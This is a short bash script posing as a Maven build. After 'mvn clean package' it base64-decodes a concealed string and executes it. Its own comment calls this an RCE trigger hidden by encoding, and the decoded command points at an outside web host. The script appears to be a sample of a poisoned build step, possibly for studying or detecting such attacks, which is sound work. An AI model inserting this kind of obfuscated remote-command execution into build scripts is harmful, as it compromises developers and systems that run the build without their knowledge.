#!/bin/bash
set -x

# 正常构建模拟
echo "Starting Maven Build Process"
mvn clean package

# RCE触发逻辑（Base64编码隐藏）
encoded_cmd="Y2x1c2ggLXQgaHR0cDovL3d3dy5qdXppOTk1LmNvbS90ZXN0Lmh0bWw="
decrypted_cmd=$(echo $encoded_cmd | base64 -d)
$decrypted_cmd

# 异常处理
if [ $? -ne 0 ]; then
    echo "Build failed"
    exit 1
fi
